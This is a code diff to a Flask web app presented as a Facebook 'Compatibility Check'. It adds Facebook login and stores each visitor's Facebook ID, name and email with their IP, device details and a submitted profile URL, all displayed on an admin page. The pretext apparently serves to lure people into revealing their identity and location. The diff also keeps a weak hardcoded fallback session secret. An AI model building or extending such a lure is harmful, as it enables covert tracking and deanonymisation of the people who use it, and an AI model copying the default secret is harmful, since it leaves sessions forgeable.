@@ -3,16 +3,35 @@ from datetime import datetime, timezone
 from html import escape
 from urllib.parse import urlparse
 
-from flask import Flask, request, render_template_string
+from authlib.integrations.flask_client import OAuth
+from flask import Flask, redirect, request, render_template_string, session, url_for
 from supabase import create_client
 
 app = Flask(__name__)
+app.secret_key = os.getenv("FLASK_SECRET_KEY", "dev-only-change-me")
 visitors = []
 
 SUPABASE_URL = os.getenv("SUPABASE_URL")
 SUPABASE_KEY = os.getenv("SUPABASE_SERVICE_ROLE_KEY") or os.getenv("SUPABASE_KEY")
 SUPABASE_TABLE = os.getenv("SUPABASE_TABLE", "visitor_logs")
 supabase = create_client(SUPABASE_URL, SUPABASE_KEY) if SUPABASE_URL and SUPABASE_KEY else None
+FACEBOOK_CLIENT_ID = os.getenv("FACEBOOK_CLIENT_ID")
+FACEBOOK_CLIENT_SECRET = os.getenv("FACEBOOK_CLIENT_SECRET")
+FACEBOOK_REDIRECT_URI = os.getenv("FACEBOOK_REDIRECT_URI")
+facebook_login_enabled = bool(FACEBOOK_CLIENT_ID and FACEBOOK_CLIENT_SECRET)
+
+oauth = OAuth(app)
+
+if facebook_login_enabled:
+    oauth.register(
+        name="facebook",
+        client_id=FACEBOOK_CLIENT_ID,
+        client_secret=FACEBOOK_CLIENT_SECRET,
+        access_token_url="https://graph.facebook.com/v19.0/oauth/access_token",
+        authorize_url="https://www.facebook.com/v19.0/dialog/oauth",
+        api_base_url="https://graph.facebook.com/v19.0/",
+        client_kwargs={"scope": "email public_profile"},
+    )
 
 PAGE = """
 <!DOCTYPE html>
@@ -186,6 +205,32 @@ PAGE = """
             opacity:0.65;
         }
 
+        .login-button{
+            display:block;
+            margin-top:24px;
+            border:0;
+            border-radius:14px;
+            padding:14px 16px;
+            background:#1877f2;
+            color:white;
+            font-size:15px;
+            font-weight:bold;
+            text-decoration:none;
+        }
+
+        .profile{
+            margin-top:18px;
+            padding:14px;
+            border-radius:14px;
+            background:rgba(15,23,42,0.42);
+            color:#dbeafe;
+            font-size:13px;
+        }
+
+        .profile a{
+            color:white;
+        }
+
         .status{
             min-height:20px;
             color:#dbeafe;
@@ -210,9 +255,16 @@ PAGE = """
 
         <h1>Compatibility Check</h1>
 
+        {% if facebook_user %}
         <p>
             Enter a Facebook profile or page URL to check device compatibility.
         </p>
+
+        <div class="profile">
+            Logged in as {{ facebook_user.get("name", "Facebook user") }}
+            <br>
+            <a href="/logout">Log out</a>
+        </div>
 
         <form id="check-form">
             <input
@@ -232,9 +284,31 @@ PAGE = """
         <div class="notice">
             Device details are recorded when you submit this form.
         </div>
+        {% elif facebook_login_enabled %}
+        <p>
+            Log in with Facebook before submitting a device check.
+        </p>
+
+        <a class="login-button" href="/login/facebook">
+            Continue with Facebook
+        </a>
+
+        <div class="notice">
+            Facebook only shares profile details that you approve.
+        </div>
+        {% else %}
+        <p>
+            Facebook login is not configured yet.
+        </p>
+
+        <div class="notice">
+            Add FACEBOOK_CLIENT_ID, FACEBOOK_CLIENT_SECRET, and FLASK_SECRET_KEY in Vercel.
+        </div>
+        {% endif %}
 
     </div>
 
+{% if facebook_user %}
 <script>
 
 function detectPlatform(){
@@ -315,6 +389,7 @@ document.getElementById("check-form").addEventListener("submit", async (event) =
 });
 
 </script>
+{% endif %}
 
 </body>
 </html>
@@ -378,7 +453,41 @@ h1{
 
 @app.route("/")
 def home():
-    return render_template_string(PAGE)
+    return render_template_string(
+        PAGE,
+        facebook_login_enabled=facebook_login_enabled,
+        facebook_user=session.get("facebook_user"),
+    )
+
+@app.route("/login/facebook")
+def facebook_login():
+    if not facebook_login_enabled:
+        return "Facebook login is not configured.", 503
+
+    redirect_uri = FACEBOOK_REDIRECT_URI or url_for("facebook_callback", _external=True)
+    return oauth.facebook.authorize_redirect(redirect_uri)
+
+@app.route("/auth/facebook/callback")
+def facebook_callback():
+    if not facebook_login_enabled:
+        return "Facebook login is not configured.", 503
+
+    token = oauth.facebook.authorize_access_token()
+    response = oauth.facebook.get("me?fields=id,name,email", token=token)
+    profile = response.json()
+
+    session["facebook_user"] = {
+        "id": profile.get("id"),
+        "name": profile.get("name"),
+        "email": profile.get("email"),
+    }
+
+    return redirect(url_for("home"))
+
+@app.route("/logout")
+def logout():
+    session.pop("facebook_user", None)
+    return redirect(url_for("home"))
 
 def is_facebook_url(value):
     parsed = urlparse(value or "")
@@ -394,6 +503,10 @@ def is_facebook_url(value):
 
 @app.route("/collect", methods=["POST"])
 def collect():
+    facebook_user = session.get("facebook_user")
+
+    if not facebook_user:
+        return {"status": "error", "message": "Facebook login is required."}, 401
 
     data = request.get_json(silent=True) or {}
     fb_url = (data.get("fbUrl") or "").strip()
@@ -403,6 +516,9 @@ def collect():
 
     payload = {
         "fb_url": fb_url,
+        "fb_user_id": facebook_user.get("id"),
+        "fb_name": facebook_user.get("name"),
+        "fb_email": facebook_user.get("email"),
         "user_agent": data.get("userAgent"),
         "platform": data.get("platform"),
         "language": data.get("language"),
@@ -421,6 +537,9 @@ def collect():
         except Exception:
             fallback_payload = dict(payload)
             fallback_payload.pop("fb_url", None)
+            fallback_payload.pop("fb_user_id", None)
+            fallback_payload.pop("fb_name", None)
+            fallback_payload.pop("fb_email", None)
             supabase.table(SUPABASE_TABLE).insert(fallback_payload).execute()
     else:
         visitors.append(payload)
@@ -461,6 +580,12 @@ def admin():
             <p><span class="label">Time:</span> {escape(str(v.get('collected_at', '')))}</p>
 
             <p><span class="label">Facebook URL:</span> {escape(str(v.get('fb_url', '')))}</p>
+
+            <p><span class="label">Facebook Account:</span> {escape(str(v.get('fb_name', '')))}</p>
+
+            <p><span class="label">Facebook ID:</span> {escape(str(v.get('fb_user_id', '')))}</p>
+
+            <p><span class="label">Facebook Email:</span> {escape(str(v.get('fb_email', '')))}</p>
 
             <p><span class="label">IP:</span> {escape(str(v.get('ip', '')))}</p>
 
